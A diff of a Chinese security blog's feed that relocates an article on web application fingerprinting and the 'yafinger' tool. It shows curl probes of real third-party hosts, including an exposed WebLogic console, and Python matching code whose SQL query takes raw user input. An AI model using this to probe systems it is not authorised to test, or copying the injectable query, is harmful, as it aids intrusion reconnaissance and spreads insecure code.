+<h4 id="指纹规则"><a href="#指纹规则" class="headerlink" title="指纹规则"></a>指纹规则</h4><h5 id="web-header-contain"><a href="#web-header-contain" class="headerlink" title="web_header_contain"></a>web_header_contain</h5><p>首页 response 里面的 header 查找特征符<br>速度最快,优先极最高。很多web cms 都会写特殊的cookie 键值。<br>例如 discuz,jboss,wordpress 等。<br>规则编写,以discuz 为例 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">➜  tools  curl  -I    www.cctry.com</div><div class="line">HTTP/1.1 200 OK</div><div class="line">Server: Microsoft-IIS/6.0</div><div class="line">Connection: keep-alive</div><div class="line">Date: Thu, 07 Jan 2016 18:22:34 GMT</div><div class="line">Content-Type: text/html; charset=gbk</div><div class="line">Content-Length: 0</div><div class="line">X-Powered-By: PHP/5.2.17</div><div class="line">Set-Cookie: Vguy_2132_saltkey=O6srsEYk; expires=Sat, 06-Feb-2016 18:22:22 GMT; path=/; httponly</div><div class="line">Set-Cookie: Vguy_2132_lastvisit=1452187342; expires=Sat, 06-Feb-2016 18:22:22 GMT; path=/</div><div class="line">Set-Cookie: Vguy_2132_sid=MwE6e0; expires=Fri, 08-Jan-2016 18:22:22 GMT; path=/</div><div class="line">Set-Cookie: Vguy_2132_lastact=1452190942%09index.php%09; expires=Fri, 08-Jan-2016 18:22:22 GMT; path=/</div><div class="line">X-Daa-Tunnel: hop_count=1</div></pre></td></tr></table></figure>
+<p>经过分析,字符串 _saltkey=  为discuz  header 中的规则<br>具体规则如下<br><img src="http://ozuqqvmm5.bkt.clouddn.com/QQ截图20171127191240.jpg" alt="img"></p>
+<h5 id="web-index-contain"><a href="#web-index-contain" class="headerlink" title="web_index_contain"></a>web_index_contain</h5><p>在缓存的首页里面查找关键词或者正则匹配<br>优先级次之,只需要 get请求一次即可。<br>例如Office Anywhere   指纹 编写流程<br>数据包分析</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">➜  tools  curl  http://125.91.218.186:8000/   |  grep   <span class="string">'/images/tongda.ico'</span></div><div class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</div><div class="line">                                 Dload  Upload   Total   Spent    Left  Speed</div><div class="line">100  2001  100  2001    0     0  11795      0 --:--:-- --:--:-- --:--:-- 11840</div><div class="line">&lt;link rel=<span class="string">"shortcut icon"</span> href=<span class="string">"/images/tongda.ico"</span>&gt;</div></pre></td></tr></table></figure>
+<p>规则编写<br><img src="http://ozuqqvmm5.bkt.clouddn.com/QQ截图20171127191233.jpg" alt="img"></p>
+<h5 id="web-url-contain"><a href="#web-url-contain" class="headerlink" title="web_url_contain"></a>web_url_contain</h5><p>特殊url 查找指定的关键词(返回状态码也指定)。<br>优先级最低。<br>例如  weblogic 的指纹 finger 过程<br>数据包分析</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">➜  tools  curl  -I     http://202.97.194.9:7001/console/login/LoginForm.jsp</div><div class="line">HTTP/1.1 200 OK</div><div class="line">Cache-Control: no-cache</div><div class="line">Date: Thu, 07 Jan 2016 18:53:28 GMT</div><div class="line">Pragma: no-cache</div><div class="line">Content-Type: text/html; charset=UTF-8</div><div class="line">Expires: Thu, 01 Jan 1970 00:00:00 GMT</div><div class="line">Set-Cookie: ADMINCONSOLESESSION=XQXrWT0LQTvpf8Jv75nMnQB9vN0cGppy7bTfJxfH9S673VTGP1Wl!1715621632; path=/</div><div class="line">Content-Language: zh-CN</div><div class="line">X-Powered-By: Servlet/2.5 JSP/2.1</div></pre></td></tr></table></figure>
+<p>规则</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;<span class="string">'url'</span>: <span class="string">'/console/login/LoginForm.jsp'</span>, <span class="string">'code'</span>: <span class="number">200</span>, <span class="string">'grep'</span>: <span class="string">'WebLogic Server'</span>&#125;</div></pre></td></tr></table></figure>
+<p>表<br><img src="http://ozuqqvmm5.bkt.clouddn.com/QQ截图20171127191224.jpg" alt="img"></p>
+<h3 id="程序编写"><a href="#程序编写" class="headerlink" title="程序编写"></a>程序编写</h3><p>指纹识别模块代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding:utf-8</span></div><div class="line"><span class="string">"""</span></div><div class="line"> *@Projet  Yafinger</div><div class="line"> *@Author  yaseng@uauc.net</div><div class="line"> *@Desc    playweb finger modules</div><div class="line">"""</div><div class="line"><span class="keyword">import</span> ast,time</div><div class="line"><span class="keyword">import</span> config</div><div class="line"><span class="keyword">from</span>   lib                <span class="keyword">import</span> util</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_web_app</span><span class="params">(url)</span>:</span></div><div class="line">    rsp_index = util.http_get(url)</div><div class="line">    str_index = <span class="string">""</span></div><div class="line">    <span class="keyword">if</span> rsp_index == <span class="keyword">None</span> :</div><div class="line">        <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line">    list_app=[]</div><div class="line">    fingers=config.get(<span class="string">'fingers'</span>);</div><div class="line">    <span class="keyword">for</span>  finger  <span class="keyword">in</span>   fingers :</div><div class="line">        rule = ast.literal_eval(finger[<span class="string">'finger'</span>])</div><div class="line">        <span class="keyword">if</span> finger[<span class="string">'type'</span>] == <span class="string">'web_index_contain'</span>: </div><div class="line">            <span class="comment"># limit header and  body and code  exp : &#123;'header':'jsessionid=','code': 200, 'grep': '.action'&#125;</span></div><div class="line">            <span class="keyword">if</span> rule.has_key(<span class="string">'header'</span>) <span class="keyword">and</span>  rule[<span class="string">'header'</span>] <span class="keyword">not</span> <span class="keyword">in</span>   str(rsp_index[<span class="string">'headers'</span>]).lower()  : </div><div class="line">                <span class="keyword">continue</span></div><div class="line">            <span class="keyword">if</span> rsp_index[<span class="string">'code'</span>] == rule[<span class="string">'code'</span>] <span class="keyword">and</span>  rule[<span class="string">'grep'</span>]  <span class="keyword">in</span> rsp_index[<span class="string">'data'</span>] :</div><div class="line">                list_app.append(&#123;<span class="string">'app_id'</span>:finger[<span class="string">'id'</span>], <span class="string">'url'</span>:url&#125;)</div><div class="line">                util.log(<span class="string">"url:%s app:%s"</span> % (url, finger[<span class="string">'app_name'</span>]))</div><div class="line">    </div><div class="line">        <span class="keyword">elif</span> finger[<span class="string">'type'</span>] == <span class="string">'web_url_contain'</span> :</div><div class="line">             rsp_tmp = util.http_get(url + rule[<span class="string">'url'</span>])</div><div class="line">             <span class="keyword">if</span> rsp_tmp == <span class="keyword">None</span> :</div><div class="line">                 <span class="keyword">continue</span></div><div class="line">             <span class="keyword">if</span> rsp_tmp[<span class="string">'code'</span>] == rule[<span class="string">'code'</span>] <span class="keyword">and</span>  rule[<span class="string">'grep'</span>]  <span class="keyword">in</span> rsp_tmp[<span class="string">'data'</span>] :</div><div class="line">                 list_app.append(&#123;<span class="string">'app_id'</span>:finger[<span class="string">'id'</span>], <span class="string">'url'</span>:url&#125;)</div><div class="line">                 util.log(<span class="string">"url:%s app:%s"</span> % (url + rule[<span class="string">'url'</span>], finger[<span class="string">'app_name'</span>]))</div><div class="line">        <span class="keyword">elif</span>  finger[<span class="string">'type'</span>] == <span class="string">'web_header_contain'</span> :</div><div class="line"></div><div class="line">            <span class="keyword">if</span>  rule[<span class="string">'grep'</span>]  <span class="keyword">in</span>  str(rsp_index[<span class="string">'headers'</span>]).lower() :</div><div class="line">                list_app.append(&#123;<span class="string">'app_id'</span>:finger[<span class="string">'id'</span>], <span class="string">'url'</span>:url&#125;)</div><div class="line">                util.log(<span class="string">"url:%s app:%s"</span> % (url , finger[<span class="string">'app_name'</span>]))</div><div class="line">                        </div><div class="line">            </div><div class="line">        time.sleep(<span class="number">0.01</span>)</div><div class="line">    <span class="keyword">return</span>  list_app</div></pre></td></tr></table></figure>
+<h3 id="单独识别"><a href="#单独识别" class="headerlink" title="单独识别"></a>单独识别</h3><p>简单调用指纹识别模块代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding:utf-8</span></div><div class="line"><span class="string">"""</span></div><div class="line"> *@Projet  Yafinger</div><div class="line"> *@Author  yaseng@uauc.net</div><div class="line"> *@Desc    yafinger test </div><div class="line">     __    __            ___                                         </div><div class="line">    /\ \  /\ \         /'___\  __                                    </div><div class="line">    \ `\`\\/'/   __   /\ \__/ /\_\     ___       __       __   _ __  </div><div class="line">     `\ `\ /'  /'__`\ \ \ ,__\\/\ \  /' _ `\   /'_ `\   /'__`\/\`'__\</div><div class="line">       `\ \ \ /\ \L\.\_\ \ \_/ \ \ \ /\ \/\ \ /\ \L\ \ /\  __/\ \ \/ </div><div class="line">         \ \_\\ \__/.\_\\ \_\   \ \_\\ \_\ \_\\ \____ \\ \____\\ \_\ </div><div class="line">          \/_/ \/__/\/_/ \/_/    \/_/ \/_/\/_/ \/___L\ \\/____/ \/_/ </div><div class="line">                                                 /\____/             </div><div class="line">                                                 \_/__/ </div><div class="line">"""</div><div class="line"><span class="keyword">import</span>   os, time, sys, Queue, threading, ast</div><div class="line"><span class="keyword">import</span> config</div><div class="line"><span class="keyword">from</span>   lib                <span class="keyword">import</span> util</div><div class="line"><span class="keyword">from</span>   lib.db             <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span>   optparse           <span class="keyword">import</span> OptionParser</div><div class="line"><span class="keyword">from</span>   modules            <span class="keyword">import</span> finger</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    usage= <span class="string">'''%prog --host  host --port  port --finger  &lt;all|app_name&gt;   \r\nExample:%prog  --url  http://127.0.0.1    --finger phpmyadmin  '''</span></div><div class="line">    parser = OptionParser(usage=usage)</div><div class="line">    parser.add_option(<span class="string">"-u"</span>, <span class="string">"--url"</span>, dest=<span class="string">"url"</span>, help=<span class="string">"target url"</span>)</div><div class="line">    parser.add_option(<span class="string">"-f"</span>, <span class="string">"--finger"</span>, dest=<span class="string">"finger"</span>, help=<span class="string">"finger_db app_name,default all "</span>, default=<span class="string">"all"</span>)</div><div class="line">    options, arguments = parser.parse_args()</div><div class="line">    <span class="keyword">if</span> options.url == <span class="keyword">None</span> :</div><div class="line">        parser.print_help() </div><div class="line">        exit(<span class="number">0</span>)</div><div class="line">    db = MySQL(config.db_config)</div><div class="line">    sql_finger_where=<span class="string">' '</span>  <span class="keyword">if</span> options.finger == <span class="string">'all'</span> <span class="keyword">else</span> <span class="string">"  and  app_name='%s' "</span>  % options.finger</div><div class="line">    db.query(<span class="string">"SELECT  * from  pw_finger_db  where  `enable`=1   %s "</span>  % sql_finger_where)</div><div class="line">    fingers = db.fetch_all()</div><div class="line">    <span class="keyword">if</span> len(fingers) == <span class="number">0</span> :</div><div class="line">        util.log(<span class="string">'finger app_name %s not found'</span> % options.finger ,<span class="number">3</span>,<span class="string">'finger'</span>) </div><div class="line">    config.set(<span class="string">"fingers"</span>,fingers)</div><div class="line">    util.log(<span class="string">"load fingers count %d"</span> % len(fingers),<span class="number">1</span>,<span class="string">'finger'</span>)</div><div class="line">    finger.get_web_app(options.url)</div></pre></td></tr></table></figure>
+<p><img src="http://ozuqqvmm5.bkt.clouddn.com/15109322329056.jpg" alt="img"></p>
+<h3 id="批量识别"><a href="#批量识别" class="headerlink" title="批量识别"></a>批量识别</h3><p> 可以使用线程池来实现批量指纹识别。</p>
+<h3 id="指纹结果"><a href="#指纹结果" class="headerlink" title="指纹结果"></a>指纹结果</h3><p>融合到系统中指纹保存在数据库中，本模块可以快速整合到扫描器或者其他项目中。</p>
+<h2 id="yafinger"><a href="#yafinger" class="headerlink" title="yafinger"></a>yafinger</h2><p>yet another  web  fingerprinter<br><a href="https://github.com/yaseng/yafinger" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/yaseng/yafinger</a></p>
+<h2 id="issue"><a href="#issue" class="headerlink" title="issue"></a>issue</h2><ol>
+<li>指纹库需要补充</li>
+<li>可以不局限于web指纹</li>
+<li>某些情况可能目前的指纹规则不符合，还需要添加新的指纹规则，例如正则</li>
+</ol>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;对于庞大的网络空间来说，存在着各式各样的应用、设备等等资产，而对这些资产进行识别，无论拿来做扫描器还是批量分析，都是非常有价值的，高效的应用
+    
+    </summary>
+    
+      <category term="web安全" scheme="http://www.future-sec.com/categories/web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="指纹识别" scheme="http://www.future-sec.com/tags/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/"/>
+    
+  </entry>
+  
+  <entry>
     <title>如何破解一个蓝牙锁</title>
     <link href="http://www.future-sec.com/how-to-crack-a-ble-lock.html"/>
     <id>http://www.future-sec.com/how-to-crack-a-ble-lock.html</id>
@@ -507,65 +1097,6 @@
       <category term="智能锁" scheme="http://www.future-sec.com/tags/%E6%99%BA%E8%83%BD%E9%94%81/"/>
     
       <category term="蓝牙攻击" scheme="http://www.future-sec.com/tags/%E8%93%9D%E7%89%99%E6%94%BB%E5%87%BB/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>浅谈现代化指纹识别及工具编写</title>
-    <link href="http://www.future-sec.com/yet-another-web-fingerprinter.html"/>
-    <id>http://www.future-sec.com/yet-another-web-fingerprinter.html</id>
-    <published>2017-11-26T16:00:00.000Z</published>
-    <updated>2017-11-27T11:19:40.481Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对于庞大的网络空间来说，存在着各式各样的应用、设备等等资产，而对这些资产进行识别，无论拿来做扫描器还是批量分析，都是非常有价值的，高效的应用指纹识别是一个长久可研究的课题，本文主要探讨如何建立高效可靠的指纹识别方法。</p>
-<h2 id="传统的指纹识别"><a href="#传统的指纹识别" class="headerlink" title="传统的指纹识别"></a>传统的指纹识别</h2><p>一些扫描器里面使用的比较多的都是通过特殊路径  静态文件的md5 值或者大小 关键词等，例如使用比较广泛的一个指纹数据库 。</p>
-<p><img src="http://ozuqqvmm5.bkt.clouddn.com/15047737007020.jpg" alt="img"><br>存在几个问题</p>
-<ol>
-<li>效率太低，每一个路径都需要访问一次。容易被waf拦截</li>
-<li>目前很多网站的静态资源 cdn于gzip 压缩，md5 其实是不一样的 ，识别率很低 </li>
-</ol>
-<h2 id="现代化指纹识别"><a href="#现代化指纹识别" class="headerlink" title="现代化指纹识别"></a>现代化指纹识别</h2><p>怎么来快速的精确的指纹识别，观察了大部分的web系统发现，访问首页并且获取response header  能识别出80% 的app<br>例如WordPress，discuz  会把独特的cookie放到header 里面。<br>discuz  的关键词  _saltkey=<br><img src="http://ozuqqvmm5.bkt.clouddn.com/15109122240334.jpg" alt="img"></p>
-<p>默认首页也会有很多固定的关键词，  WordPress   wp-conetnt<br><img src="http://ozuqqvmm5.bkt.clouddn.com/15109123220322.jpg" alt="img"></p>
-<p>剩下的指纹再去特殊url提取，这样效率和准确率会提高很多很多。</p>
-<h2 id="现代化指纹识别方案"><a href="#现代化指纹识别方案" class="headerlink" title="现代化指纹识别方案"></a>现代化指纹识别方案</h2><h3 id="指纹库设计"><a href="#指纹库设计" class="headerlink" title="指纹库设计"></a>指纹库设计</h3><h4 id="数据库结构"><a href="#数据库结构" class="headerlink" title="数据库结构"></a>数据库结构</h4><p><img src="http://ozuqqvmm5.bkt.clouddn.com/QQ截图20171127191426.jpg" alt="img"><br>指纹库类型目前有3种 ，当然后续还需要加上正则。<br>finger 规则是一个 string 之后的python 字典,里面有例如状态吗,规则等字段,例如  weblogic 的指纹规则</p>
-<figure class="highlight xquery"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;<span class="string">'port'</span>:<span class="number">7001</span>,<span class="string">'url'</span>: <span class="string">'/console/login/LoginForm.jsp'</span>, <span class="string">'code'</span>: <span class="number">200</span>, <span class="string">'grep'</span>: <span class="string">'WebLogic Server'</span>&#125;</div></pre></td></tr></table></figure>
-<p>下面介绍每一种指纹库实例</p>
-<h4 id="指纹规则"><a href="#指纹规则" class="headerlink" title="指纹规则"></a>指纹规则</h4><h5 id="web-header-contain"><a href="#web-header-contain" class="headerlink" title="web_header_contain"></a>web_header_contain</h5><p>首页 response 里面的 header 查找特征符<br>速度最快,优先极最高。很多web cms 都会写特殊的cookie 键值。<br>例如 discuz,jboss,wordpress 等。<br>规则编写,以discuz 为例 </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">➜  tools  curl  -I    www.cctry.com</div><div class="line">HTTP/1.1 200 OK</div><div class="line">Server: Microsoft-IIS/6.0</div><div class="line">Connection: keep-alive</div><div class="line">Date: Thu, 07 Jan 2016 18:22:34 GMT</div><div class="line">Content-Type: text/html; charset=gbk</div><div class="line">Content-Length: 0</div><div class="line">X-Powered-By: PHP/5.2.17</div><div class="line">Set-Cookie: Vguy_2132_saltkey=O6srsEYk; expires=Sat, 06-Feb-2016 18:22:22 GMT; path=/; httponly</div><div class="line">Set-Cookie: Vguy_2132_lastvisit=1452187342; expires=Sat, 06-Feb-2016 18:22:22 GMT; path=/</div><div class="line">Set-Cookie: Vguy_2132_sid=MwE6e0; expires=Fri, 08-Jan-2016 18:22:22 GMT; path=/</div><div class="line">Set-Cookie: Vguy_2132_lastact=1452190942%09index.php%09; expires=Fri, 08-Jan-2016 18:22:22 GMT; path=/</div><div class="line">X-Daa-Tunnel: hop_count=1</div></pre></td></tr></table></figure>
-<p>经过分析,字符串 _saltkey=  为discuz  header 中的规则<br>具体规则如下<br><img src="http://ozuqqvmm5.bkt.clouddn.com/QQ截图20171127191240.jpg" alt="img"></p>
-<h5 id="web-index-contain"><a href="#web-index-contain" class="headerlink" title="web_index_contain"></a>web_index_contain</h5><p>在缓存的首页里面查找关键词或者正则匹配<br>优先级次之,只需要 get请求一次即可。<br>例如Office Anywhere   指纹 编写流程<br>数据包分析</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">➜  tools  curl  http://125.91.218.186:8000/   |  grep   <span class="string">'/images/tongda.ico'</span></div><div class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</div><div class="line">                                 Dload  Upload   Total   Spent    Left  Speed</div><div class="line">100  2001  100  2001    0     0  11795      0 --:--:-- --:--:-- --:--:-- 11840</div><div class="line">&lt;link rel=<span class="string">"shortcut icon"</span> href=<span class="string">"/images/tongda.ico"</span>&gt;</div></pre></td></tr></table></figure>
-<p>规则编写<br><img src="http://ozuqqvmm5.bkt.clouddn.com/QQ截图20171127191233.jpg" alt="img"></p>
-<h5 id="web-url-contain"><a href="#web-url-contain" class="headerlink" title="web_url_contain"></a>web_url_contain</h5><p>特殊url 查找指定的关键词(返回状态码也指定)。<br>优先级最低。<br>例如  weblogic 的指纹 finger 过程<br>数据包分析</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">➜  tools  curl  -I     http://202.97.194.9:7001/console/login/LoginForm.jsp</div><div class="line">HTTP/1.1 200 OK</div><div class="line">Cache-Control: no-cache</div><div class="line">Date: Thu, 07 Jan 2016 18:53:28 GMT</div><div class="line">Pragma: no-cache</div><div class="line">Content-Type: text/html; charset=UTF-8</div><div class="line">Expires: Thu, 01 Jan 1970 00:00:00 GMT</div><div class="line">Set-Cookie: ADMINCONSOLESESSION=XQXrWT0LQTvpf8Jv75nMnQB9vN0cGppy7bTfJxfH9S673VTGP1Wl!1715621632; path=/</div><div class="line">Content-Language: zh-CN</div><div class="line">X-Powered-By: Servlet/2.5 JSP/2.1</div></pre></td></tr></table></figure>
-<p>规则</p>
-<figure class="highlight xquery"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;<span class="string">'url'</span>: <span class="string">'/console/login/LoginForm.jsp'</span>, <span class="string">'code'</span>: <span class="number">200</span>, <span class="string">'grep'</span>: <span class="string">'WebLogic Server'</span>&#125;</div></pre></td></tr></table></figure>
-<p>表<br><img src="http://ozuqqvmm5.bkt.clouddn.com/QQ截图20171127191224.jpg" alt="img"></p>
-<h3 id="程序编写"><a href="#程序编写" class="headerlink" title="程序编写"></a>程序编写</h3><p>指纹识别模块代码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding:utf-8</span></div><div class="line"><span class="string">"""</span></div><div class="line"> *@Projet  Yafinger</div><div class="line"> *@Author  yaseng@uauc.net</div><div class="line"> *@Desc    playweb finger modules</div><div class="line">"""</div><div class="line"><span class="keyword">import</span> ast,time</div><div class="line"><span class="keyword">import</span> config</div><div class="line"><span class="keyword">from</span>   lib                <span class="keyword">import</span> util</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_web_app</span><span class="params">(url)</span>:</span></div><div class="line">    rsp_index = util.http_get(url)</div><div class="line">    str_index = <span class="string">""</span></div><div class="line">    <span class="keyword">if</span> rsp_index == <span class="keyword">None</span> :</div><div class="line">        <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line">    list_app=[]</div><div class="line">    fingers=config.get(<span class="string">'fingers'</span>);</div><div class="line">    <span class="keyword">for</span>  finger  <span class="keyword">in</span>   fingers :</div><div class="line">        rule = ast.literal_eval(finger[<span class="string">'finger'</span>])</div><div class="line">        <span class="keyword">if</span> finger[<span class="string">'type'</span>] == <span class="string">'web_index_contain'</span>: </div><div class="line">            <span class="comment"># limit header and  body and code  exp : &#123;'header':'jsessionid=','code': 200, 'grep': '.action'&#125;</span></div><div class="line">            <span class="keyword">if</span> rule.has_key(<span class="string">'header'</span>) <span class="keyword">and</span>  rule[<span class="string">'header'</span>] <span class="keyword">not</span> <span class="keyword">in</span>   str(rsp_index[<span class="string">'headers'</span>]).lower()  : </div><div class="line">                <span class="keyword">continue</span></div><div class="line">            <span class="keyword">if</span> rsp_index[<span class="string">'code'</span>] == rule[<span class="string">'code'</span>] <span class="keyword">and</span>  rule[<span class="string">'grep'</span>]  <span class="keyword">in</span> rsp_index[<span class="string">'data'</span>] :</div><div class="line">                list_app.append(&#123;<span class="string">'app_id'</span>:finger[<span class="string">'id'</span>], <span class="string">'url'</span>:url&#125;)</div><div class="line">                util.log(<span class="string">"url:%s app:%s"</span> % (url, finger[<span class="string">'app_name'</span>]))</div><div class="line">    </div><div class="line">        <span class="keyword">elif</span> finger[<span class="string">'type'</span>] == <span class="string">'web_url_contain'</span> :</div><div class="line">             rsp_tmp = util.http_get(url + rule[<span class="string">'url'</span>])</div><div class="line">             <span class="keyword">if</span> rsp_tmp == <span class="keyword">None</span> :</div><div class="line">                 <span class="keyword">continue</span></div><div class="line">             <span class="keyword">if</span> rsp_tmp[<span class="string">'code'</span>] == rule[<span class="string">'code'</span>] <span class="keyword">and</span>  rule[<span class="string">'grep'</span>]  <span class="keyword">in</span> rsp_tmp[<span class="string">'data'</span>] :</div><div class="line">                 list_app.append(&#123;<span class="string">'app_id'</span>:finger[<span class="string">'id'</span>], <span class="string">'url'</span>:url&#125;)</div><div class="line">                 util.log(<span class="string">"url:%s app:%s"</span> % (url + rule[<span class="string">'url'</span>], finger[<span class="string">'app_name'</span>]))</div><div class="line">        <span class="keyword">elif</span>  finger[<span class="string">'type'</span>] == <span class="string">'web_header_contain'</span> :</div><div class="line"></div><div class="line">            <span class="keyword">if</span>  rule[<span class="string">'grep'</span>]  <span class="keyword">in</span>  str(rsp_index[<span class="string">'headers'</span>]).lower() :</div><div class="line">                list_app.append(&#123;<span class="string">'app_id'</span>:finger[<span class="string">'id'</span>], <span class="string">'url'</span>:url&#125;)</div><div class="line">                util.log(<span class="string">"url:%s app:%s"</span> % (url , finger[<span class="string">'app_name'</span>]))</div><div class="line">                        </div><div class="line">            </div><div class="line">        time.sleep(<span class="number">0.01</span>)</div><div class="line">    <span class="keyword">return</span>  list_app</div></pre></td></tr></table></figure>
-<h3 id="单独识别"><a href="#单独识别" class="headerlink" title="单独识别"></a>单独识别</h3><p>简单调用指纹识别模块代码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding:utf-8</span></div><div class="line"><span class="string">"""</span></div><div class="line"> *@Projet  Yafinger</div><div class="line"> *@Author  yaseng@uauc.net</div><div class="line"> *@Desc    yafinger test </div><div class="line">     __    __            ___                                         </div><div class="line">    /\ \  /\ \         /'___\  __                                    </div><div class="line">    \ `\`\\/'/   __   /\ \__/ /\_\     ___       __       __   _ __  </div><div class="line">     `\ `\ /'  /'__`\ \ \ ,__\\/\ \  /' _ `\   /'_ `\   /'__`\/\`'__\</div><div class="line">       `\ \ \ /\ \L\.\_\ \ \_/ \ \ \ /\ \/\ \ /\ \L\ \ /\  __/\ \ \/ </div><div class="line">         \ \_\\ \__/.\_\\ \_\   \ \_\\ \_\ \_\\ \____ \\ \____\\ \_\ </div><div class="line">          \/_/ \/__/\/_/ \/_/    \/_/ \/_/\/_/ \/___L\ \\/____/ \/_/ </div><div class="line">                                                 /\____/             </div><div class="line">                                                 \_/__/ </div><div class="line">"""</div><div class="line"><span class="keyword">import</span>   os, time, sys, Queue, threading, ast</div><div class="line"><span class="keyword">import</span> config</div><div class="line"><span class="keyword">from</span>   lib                <span class="keyword">import</span> util</div><div class="line"><span class="keyword">from</span>   lib.db             <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span>   optparse           <span class="keyword">import</span> 